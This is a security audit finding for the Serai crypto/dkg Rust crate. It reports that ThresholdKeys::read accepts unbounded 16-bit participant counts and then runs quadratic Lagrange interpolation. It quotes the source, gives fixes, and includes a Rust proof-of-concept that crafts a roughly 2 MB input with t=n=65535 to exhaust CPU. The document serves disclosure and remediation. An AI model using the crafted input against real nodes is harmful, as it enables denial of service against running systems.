### Title
Quadratic-complexity Lagrange interpolation enables DoS via attacker-controlled `ThresholdKeys`/`ThresholdView` parameters - (File: crypto/dkg/src/lib.rs)

### Summary
The SimpleSAMLphp advisory (GHSA-5cjr-mxj5-wmrx) is a CWE-400 bug: an unbounded, attacker-influenced transform count let a small message trigger disproportionate CPU work. The direct analog in Serai's in-scope code is the Lagrange interpolation in `crypto/dkg`: `ThresholdKeys::read` accepts a fully attacker-controlled `t`/`n` (each a `u16`, up to 65,535) and then performs `O(t²)` scalar field multiplications to derive `group_key`, and `ThresholdView::view` performs `O(|included|²)` scalar work plus `O(|included|)` point multiplications. A few megabytes of untrusted input can force billions of field multiplications, an asymmetric CPU exhaustion attack.

### Finding Description
`Interpolation::interpolation_factor` recomputes the full Lagrange numerator/denominator product over `included` for every participant it is evaluated for:

```rust
// crypto/dkg/src/lib.rs:226-247
fn interpolation_factor(&self, i: Participant, included: &[Participant]) -> F {
  match self {
    Interpolation::Constant(c) => c[usize::from(u16::from(i) - 1)],
    Interpolation::Lagrange => {
      let i_f = F::from(u64::from(u16::from(i)));
      let mut num = F::ONE;
      let mut denom = F::ONE;
      for l in included { ... num *= share; denom *= share - i_f; }
      num * denom.invert().unwrap()
    }
  }
}
```

`ThresholdKeys::new` evaluates this for every participant `1..=t` when computing `group_key` (`crypto/dkg/src/lib.rs:376-378`), giving `O(t²)` field multiplications plus `t` inversions. `ThresholdKeys::view` evaluates it once for the local share and once per included verification share (`crypto/dkg/src/lib.rs:494-507`), giving `O(n²)` field multiplications and `O(n)` group operations.

The parameters are read straight from the wire in `ThresholdKeys::read` (`crypto/dkg/src/lib.rs:574-632`): `t`, `n`, `i` are raw `u16`s, and the only validation is `t <= n` and `i <= n`. There is no cap tying `t`/`n` to any sane protocol bound (real validator sets are capped far below `u16::MAX`). An attacker supplies `t = n = 65535` with 65,535 point encodings (~2–4 MB depending on ciphersuite) and triggers on the order of `65535² ≈ 4.3 × 10⁹` field multiplications plus 65,535 scalar inversions and point multiplications — all before any signature-related validity check. `Constant` interpolation is also attacker-selectable but is only `O(n)`, so Lagrange is the expensive path; note `ThresholdKeys::new` does not reject `Interpolation::Constant` with a `c` length mismatched to `n` until indexing panics — the Lagrange path is the clean DoS.

`ThresholdKeys::read` is listed among the deserialization sinks reachable with untrusted bytes, so this is the strongest reachable path: `read` → `ThresholdKeys::new` → quadratic `interpolation_factor` loop.

### Impact Explanation
An unprivileged party who can feed bytes to `ThresholdKeys::read` (or induce a `view()` over a large `included` set) causes CPU consumption quadratic in a 16-bit field they control. ~4 billion field multiplications per call will stall a signing/verification thread for an extended period; repeated submissions amplify it into sustained denial of service of the node/process performing the deserialization. This matches the CWE-400 / availability-impact profile of the XPath-transform advisory: small message, disproportionate computation, no authentication required.

### Likelihood Explanation
Reachability depends on a deployment feeding unauthenticated bytes into `ThresholdKeys::read` before other checks. The cost asymmetry is real and deterministic (input size is linear, work is quadratic), so wherever the read path is exposed to peer-supplied data it is trivially triggerable — the attacker only needs to craft a header with `t = n = 0xFFFF`, a Lagrange tag, one secret share, and `n` valid point encodings. No valid key, proof, or signature is needed because the expensive work happens inside `ThresholdKeys::new` during construction.

### Recommendation
- Bound `t`/`n` at deserialization and construction time to the protocol's actual maximum participant count (e.g., `MAX_KEY_SHARES_PER_SET`-style constant), rather than the full `u16` range.
- Cache or precompute Lagrange denominators/numerators so `view`/`new` are `O(n)` rather than `O(n²)` (standard barycentric/Lagrange precomputation), or at minimum short-circuit `interpolation_factor` work behind the size bound.
- Consider performing a cheap sanity/validity gate on inputs before invoking `ThresholdKeys::new`'s quadratic path.

### Proof of Concept
```rust
// Conceptual PoC against crypto/dkg ThresholdKeys::read (Ristretto shown; any Ciphersuite works)
use std::io;
use ciphersuite::Ristretto;
use dkg::{Participant, ThresholdKeys};

fn craft() -> Vec<u8> {
  let mut buf = vec![];
  // curve ID
  let id = <Ristretto as ciphersuite::Ciphersuite>::ID;
  buf.extend((id.len() as u32).to_le_bytes());
  buf.extend(id);
  // t = n = 65535, i = 1
  buf.extend(65535u16.to_le_bytes());
  buf.extend(65535u16.to_le_bytes());
  buf.extend(1u16.to_le_bytes());
  // interpolation = Lagrange (tag 1)
  buf.push(1u8);
  // secret_share = 1
  buf.extend(<Ristretto as ciphersuite::Ciphersuite>::F::ONE.to_repr().as_ref());
  // n verification shares, all the generator encoding
  let g = <Ristretto as ciphersuite::Ciphersuite>::generator().to_bytes();
  for _ in 0 .. 65535 {
    buf.extend(g.as_ref());
  }
  buf
}

fn main() {
  // ~2 MB input; triggers ~4.3e9 field multiplications + 65535 inversions/point ops
  // inside ThresholdKeys::new while computing group_key via O(t^2) interpolation_factor.
  let _keys: io::Result<ThresholdKeys<Ristretto>> =
    ThresholdKeys::read(&mut craft().as_slice());
}
``` [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) 

Caveat: this was validated against the in-scope source rather than executed. The quadratic loop structure and the absence of a bound on `t`/`n` beyond `t <= n <= u16::MAX` are directly confirmed in `crypto/dkg/src/lib.rs`; the reachability premise relies on the stated rule that `ThresholdKeys::read` processes untrusted bytes in production flows.

### Citations

**File:** crypto/dkg/src/lib.rs (L226-247)
```rust
  fn interpolation_factor(&self, i: Participant, included: &[Participant]) -> F {
    match self {
      Interpolation::Constant(c) => c[usize::from(u16::from(i) - 1)],
      Interpolation::Lagrange => {
        let i_f = F::from(u64::from(u16::from(i)));

        let mut num = F::ONE;
        let mut denom = F::ONE;
        for l in included {
          if i == *l {
            continue;
          }

          let share = F::from(u64::from(u16::from(*l)));
          num *= share;
          denom *= share - i_f;
        }

        // Safe as this will only be 0 if we're part of the above loop
        // (which we have an if case to avoid)
        num * denom.invert().unwrap()
      }
```

**File:** crypto/dkg/src/lib.rs (L376-378)
```rust
    let t = (1 ..= params.t()).map(Participant).collect::<Vec<_>>();
    let group_key =
      t.iter().map(|i| verification_shares[i] * interpolation.interpolation_factor(*i, &t)).sum();
```

**File:** crypto/dkg/src/lib.rs (L494-507)
```rust
    let secret_share_scaled = Zeroizing::new(self.scalar * self.original_secret_share().deref());
    let mut secret_share = Zeroizing::new(
      self.core.interpolation.interpolation_factor(self.params().i(), &included) *
        secret_share_scaled.deref(),
    );

    let mut verification_shares = HashMap::with_capacity(included.len());
    for i in &included {
      let verification_share = self.core.verification_shares[i];
      let verification_share = verification_share *
        self.scalar *
        self.core.interpolation.interpolation_factor(*i, &included);
      verification_shares.insert(*i, verification_share);
    }
```

**File:** crypto/dkg/src/lib.rs (L574-632)
```rust
  pub fn read<R: io::Read>(reader: &mut R) -> io::Result<ThresholdKeys<C>> {
    {
      let different = || io::Error::other("deserializing ThresholdKeys for another curve");

      let mut id_len = [0; 4];
      reader.read_exact(&mut id_len)?;
      if u32::try_from(C::ID.len()).unwrap().to_le_bytes() != id_len {
        Err(different())?;
      }

      let mut id = vec![0; C::ID.len()];
      reader.read_exact(&mut id)?;
      if id != C::ID {
        Err(different())?;
      }
    }

    let (t, n, i) = {
      let mut read_u16 = || -> io::Result<u16> {
        let mut value = [0; 2];
        reader.read_exact(&mut value)?;
        Ok(u16::from_le_bytes(value))
      };
      (
        read_u16()?,
        read_u16()?,
        Participant::new(read_u16()?).ok_or(io::Error::other("invalid participant index"))?,
      )
    };

    let mut interpolation = [0];
    reader.read_exact(&mut interpolation)?;
    let interpolation = match interpolation[0] {
      0 => Interpolation::Constant({
        let mut res = Vec::with_capacity(usize::from(n));
        for _ in 0 .. n {
          res.push(C::read_F(reader)?);
        }
        res
      }),
      1 => Interpolation::Lagrange,
      _ => Err(io::Error::other("invalid interpolation method"))?,
    };

    let secret_share = Zeroizing::new(C::read_F(reader)?);

    let mut verification_shares = HashMap::new();
    for l in (1 ..= n).map(Participant) {
      verification_shares.insert(l, <C as Ciphersuite>::read_G(reader)?);
    }

    ThresholdKeys::new(
      ThresholdParams::new(t, n, i).map_err(io::Error::other)?,
      interpolation,
      secret_share,
      verification_shares,
    )
    .map_err(io::Error::other)
  }
```
